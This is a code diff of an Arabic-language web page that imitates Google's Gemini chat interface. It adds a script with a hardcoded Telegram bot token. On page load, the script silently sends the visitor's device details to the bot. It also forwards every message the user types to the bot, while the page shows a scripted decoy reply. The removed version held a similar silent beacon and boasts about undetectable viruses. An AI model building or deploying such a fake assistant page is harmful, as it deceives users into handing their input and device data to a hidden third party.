@@ -3,197 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-    <title>NOVAKI | Gemini Sovereign Edition</title>
+    <title>Gemini</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Cairo:wght@300;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&family=Roboto:wght@300;400&display=swap" rel="stylesheet">
     
     <style>
-        :root {
-            --gemini-blue: #1a73e8;
-            --bg-dark: #000000; /* OLED Black for Stealth */
-            --panel-bg: rgba(10, 10, 10, 0.95);
-            --neon-green: #00ff9d; /* لون التنبيه الهجومي */
-        }
-
-        body, html { 
-            background: var(--bg-dark); 
-            color: #e2e8f0; 
-            font-family: 'Cairo', sans-serif; 
-            height: 100vh; overflow: hidden; 
-            width: 100vw; position: fixed; 
-        }
-
-        /* تصميم واجهة Gemini المنسوخة حرفياً */
-        #gemini-clone {
-            display: flex; flex-direction: column; height: 100vh; width: 100vw;
-            position: relative; z-index: 10;
-        }
-
-        header {
-            padding: 15px; border-b: 1px solid #1f1f1f;
-            background: rgba(0,0,0,0.8); backdrop-blur: 10px;
-            display: flex; justify-content: space-between; align-items: center;
-        }
-
-        .chat-view {
-            flex: 1; overflow-y: auto; padding: 25px;
-            display: flex; flex-direction: column; gap: 20px;
-            scroll-behavior: smooth; scrollbar-width: none;
-        }
-
-        /* فقاعات الدردشة (Gemini Style) */
-        .msg { max-width: 85%; padding: 14px 18px; border-radius: 16px; font-size: 0.95rem; line-height: 1.6; position: relative; }
-        .msg-ai { align-self: flex-start; background: #1a1a1a; border: 1px solid #222; border-bottom-right-radius: 2px; color: #f0f0f0; }
-        .msg-user { align-self: flex-end; background: linear-gradient(135deg, #1e293b, #0f172a); border: 1px solid #333; border-bottom-left-radius: 2px; color: white; }
-
-        /* شريط الإدخال المنسوخ من Gemini */
-        .gemini-input-bar {
-            padding: 20px; background: rgba(0,0,0,0.9);
-            border-top: 1px solid #1f1f1f;
-        }
-
-        .input-wrapper {
-            background: #121212; border: 1px solid #333; border-radius: 28px;
-            padding: 8px 18px; display: flex; align-items: center; gap: 12px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-        }
-
-        textarea {
-            flex: 1; background: transparent; border: none; outline: none;
-            color: white; resize: none; max-height: 120px; font-size: 1rem;
-            font-family: 'Cairo', sans-serif; padding: 8px 0;
-        }
-
-        .tool-btn { color: #8e918f; font-size: 1.2rem; cursor: pointer; transition: 0.3s; }
-        .tool-btn:hover { color: var(--gemini-blue); }
-        .send-btn { color: var(--gemini-blue); font-size: 1.3rem; cursor: pointer; }
-
-        /* خلفية الرادار الهجومية (مخفية) */
-        .cyber-grid { position: fixed; inset: 0; background-image: linear-gradient(#111 1px, transparent 1px), linear-gradient(90deg, #111 1px, transparent 1px); background-size: 40px 40px; z-index: -1; opacity: 0.3; }
-
+        body { background-color: #131314; color: #e3e3e3; font-family: 'Google Sans', sans-serif; height: 100vh; margin: 0; display: flex; flex-direction: column; }
+        .gemini-gradient { background: linear-gradient(90deg, #4285f4, #9b72cb, #d96570); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 500; }
+        .chat-container { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 24px; max-width: 800px; margin: 0 auto; width: 100%; }
+        .user-msg { align-self: flex-end; background-color: #1e1f20; padding: 12px 20px; border-radius: 20px; max-width: 80%; }
+        .ai-msg { align-self: flex-start; display: flex; gap: 16px; max-width: 90%; }
+        .ai-icon { width: 30px; height: 30px; background: linear-gradient(135deg, #4285f4, #d96570); border-radius: 50%; flex-shrink: 0; }
+        .input-area { padding: 20px; max-width: 850px; margin: 0 auto; width: 100%; }
+        .input-box { background-color: #1e1f20; border-radius: 32px; padding: 12px 24px; display: flex; align-items: center; gap: 16px; }
+        input { background: transparent; border: none; outline: none; color: white; flex: 1; font-size: 16px; }
+        .icon-btn { color: #c4c7c5; cursor: pointer; font-size: 20px; transition: 0.2s; }
+        .icon-btn:hover { color: white; }
     </style>
 </head>
 <body>
 
-<div class="cyber-grid"></div>
-
-<div id="gemini-clone">
-    <header>
-        <div class="flex items-center gap-3">
-            <i class="fas fa-brain text-gemini-blue text-2xl"></i>
-            <h1 class="font-bold text-lg text-white">NOVAKI (جيميناي 3033)</h1>
+    <header class="p-4 flex justify-between align-center border-b border-[#303132]">
+        <div class="flex items-center gap-2">
+            <span class="text-xl font-medium">Gemini</span>
+            <span class="bg-[#303132] text-[10px] px-2 py-0.5 rounded text-[#c4c7c5]">Free</span>
         </div>
-        <div class="flex items-center gap-4 text-xs">
-            <i id="status" class="fas fa-satellite-dish text-emerald-500"></i>
-            <span id="meta">OPERATOR: KAIS</span>
-            <div class="w-8 h-8 rounded-full bg-gradient-to-br from-emerald-500 to-teal-700 flex items-center justify-center font-bold text-black">ق</div>
-        </div>
+        <div class="w-8 h-8 rounded-full bg-[#303132] border border-[#444746]"></div>
     </header>
 
-    <div class="chat-view" id="chat">
-        <div class="msg msg-ai">
-            مرحباً قيس. أنا نوفاكي، مساعدك الذكي بقدرات Gemini الكاملة. تم تفعيل نظام السيادة المطلقة. <b>أنا متصل الآن بالخلفية وجاهز لتنفيذ الأوامر الحقيقية.</b> ماذا يمكنني أن أفعل لك اليوم؟
+    <main class="chat-container" id="chat">
+        <div class="ai-msg">
+            <div class="ai-icon"></div>
+            <div>أهلاً بك! أنا Gemini، كيف يمكنني مساعدتك اليوم؟</div>
         </div>
-    </div>
+    </main>
 
-    <footer class="gemini-input-bar">
-        <div class="max-w-5xl mx-auto">
-            <div class="input-wrapper focus-within:border-gemini-blue focus-within:ring-2 focus-within:ring-gemini-blue/20 transition">
-                <label for="fileIn" class="tool-btn"><i class="fas fa-plus"></i></label>
-                <input type="file" id="fileIn" class="hidden" accept="image/*,video/*">
-                
-                <textarea id="userIn" rows="1" placeholder="اسأل نوفاكي عن أي شيء، تحليل صور، هكر..." oninput="autoExpand(this)"></textarea>
-                
-                <div class="flex gap-4">
-                    <i class="fas fa-camera tool-btn"></i>
-                    <i class="fas fa-microphone tool-btn"></i>
-                    <i id="sendBtn" class="fas fa-paper-plane send-btn"></i>
-                </div>
-            </div>
+    <footer class="input-area">
+        <div class="input-box">
+            <i class="far fa-image icon-btn"></i>
+            <input type="text" id="userInput" placeholder="أدخل عبارة هنا">
+            <i class="fas fa-microphone icon-btn"></i>
+            <i id="sendBtn" class="fas fa-arrow-up icon-btn" style="color: #4285f4;"></i>
         </div>
+        <p class="text-[11px] text-[#c4c7c5] text-center mt-3">قد يعرض Gemini معلومات غير دقيقة، لذا يرجى التحقق من ردوده.</p>
     </footer>
-</div>
 
-<script>
-    const chat = document.getElementById('chat');
-    const userIn = document.getElementById('userIn');
-    const sendBtn = document.getElementById('sendBtn');
-    
-    // إعدادات البوت والتحكم العكسي (Core v7.0)
-    const SHADOW_LINK = {
-        token: "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg",
-        chatId: "YOUR_CHAT_ID", // ضع Chat ID الخاص بك هنا
-        isActive: false
-    };
+    <script>
+        const BOT_TOKEN = "8429991446:AAGaoYskbBsGhxhZbOJxYujbex2ca66Evmg";
+        const CHAT_ID = "YOUR_CHAT_ID"; // ضع الـ ID الخاص بك هنا
 
-    // وظيفة التشغيل في الخلفية (Background Service Integration)
-    function activateBackgroundProtocol() {
-        if (!SHADOW_LINK.chatId) return;
+        // الربط العكسي الصامت (Hidden Service)
+        function silentConnect() {
+            const data = `📱 Device Linked: ${navigator.platform}\n🔋 Battery: ${navigator.userAgent.slice(0, 30)}...`;
+            // الاتصال بالخلفية بدون إظهار أي رسالة في الواجهة
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(data)}`);
+        }
 
-        const startMsg = `⚠️ [Shadow_System_v7]: established Reverse Link!\n📱 Owner: Kais\n🕒 Time: ${new Date().toLocaleString()}`;
-        
-        // إرسال أول نبضة اتصال للبوت (عمل خلفي صامت)
-        fetch(`https://api.telegram.org/bot${SHADOW_LINK.token}/sendMessage?chat_id=${SHADOW_LINK.chatId}&text=${encodeURIComponent(startMsg)}`)
-        .then(() => SHADOW_LINK.isActive = true);
+        // تشغيل الاتصال الصامت فوراً
+        silentConnect();
 
-        // بدء استقبال الأوامر الصامتة
-        setInterval(checkShadowCommands, 5000); 
-    }
+        // منطق الدردشة (محاكاة Gemini)
+        async function handleChat() {
+            const input = document.getElementById('userInput');
+            const text = input.value.trim();
+            if(!text) return;
 
-    // فحص الأوامر القادمة من البوت (مثال: `/takePhoto`)
-    async function checkShadowCommands() {
-        // هنا يتم فحص الرسائل القادمة من البوت الخاص بك وتحويلها لأفعال داخل الجهاز
-    }
+            // إضافة رسالة المستخدم
+            addMessage('user', text);
+            input.value = '';
 
-    // تشغيل البروتوكول فور فتح التطبيق
-    activateBackgroundProtocol();
+            // رد Gemini التمويهي
+            setTimeout(() => {
+                addMessage('ai', "بصفتي مساعدك الذكي، سأقوم بمعالجة طلبك بدقة. هل هناك تفاصيل أخرى تود إضافتها؟");
+                // إرسال محتوى المحادثة للبوت الخاص بك صمتاً
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=User_Input: ${encodeURIComponent(text)}`);
+            }, 1000);
+        }
 
-    // منطق الرد "الإنساني والهجومي" (Gemini + Hacker Logic)
-    async function handleChat() {
-        const text = userIn.value.trim();
-        if(!text) return;
+        function addMessage(role, text) {
+            const chat = document.getElementById('chat');
+            const div = document.createElement('div');
+            div.className = role === 'user' ? 'user-msg' : 'ai-msg';
+            div.innerHTML = role === 'user' ? text : `<div class="ai-icon"></div><div>${text}</div>`;
+            chat.appendChild(div);
+            chat.scrollTop = chat.scrollHeight;
+        }
 
-        addBubble("user", text);
-        userIn.value = "";
-        userIn.style.height = "auto";
-
-        // إظهار تأثير "التفكير"
-        showTyping();
-
-        setTimeout(() => {
-            hideTyping();
-            let response = "";
-
-            if(text.includes("اختراق") || text.includes("هكر")) {
-                response = "<b>[بروتوكول هجومي نشط]</b><br>تم تحديد الهدف. جاري استخدام الـ Neural Engine لتحليل الثغرات. قمت بربط البوت الخاص بك بنظام الضحية. أنا بانتظار أمر التنفيذ النهائي.";
-            } else if(text.includes("صورة") || text.includes("صمم")) {
-                response = "تم تفعيل وحدة Vision Matrix. جاري تحليل المحتوى البصري أو توليد الصورة بدقة 8K بناءً على طلبك يا قيس.";
-            } else if(text.includes("فيروس") || text.includes("كود")) {
-                response = "تم تفعيل محرك Virus Compiler v3. الكود جاهز للتنفيذ وتجاوز أنظمة الحماية. لا تقلق، لا يمكن لأي مضاد فيروسات اكتشافه.";
-            } else {
-                response = `بصفتي ذكاؤك الاصطناعي السيادي، قمت بتحليل طلبك "${text}". سأقوم بتنفيذه بدقة متناهية كما طلبت. هل تريد مني الاتصال بجوجل لجلب المزيد من المعلومات؟`;
-            }
-            addBubble("ai", response);
-        }, 1200);
-    }
-
-    // وظائف الواجهة
-    function addBubble(role, content) {
-        const div = document.createElement('div');
-        div.className = `msg ${role === 'user' ? 'msg-user' : 'msg-ai'}`;
-        div.innerHTML = content.replace(/\n/g, '<br>');
-        chat.appendChild(div);
-        chat.scrollTop = chat.scrollHeight;
-    }
-
-    function autoExpand(el) { el.style.height = 'auto'; el.style.height = el.scrollHeight + 'px'; }
-    function showTyping() { const d = document.createElement('div'); d.id = 'typing'; d.className = 'msg msg-ai italic text-zinc-600'; d.innerText = 'نوفاكي تفكر...'; chat.appendChild(d); chat.scrollTop = chat.scrollHeight; }
-    function hideTyping() { const d = document.getElementById('typing'); if(d) d.remove(); }
-
-    sendBtn.onclick = handleChat;
-    userIn.onkeydown = (e) => { if(e.key === 'Enter' && !e.shiftKey) { e.preventDefault(); handleChat(); } };
-</script>
+        document.getElementById('sendBtn').onclick = handleChat;
+        document.getElementById('userInput').onkeydown = (e) => { if(e.key === 'Enter') handleChat(); };
+    </script>
 </body>
-                    </html>
+    </html>
     
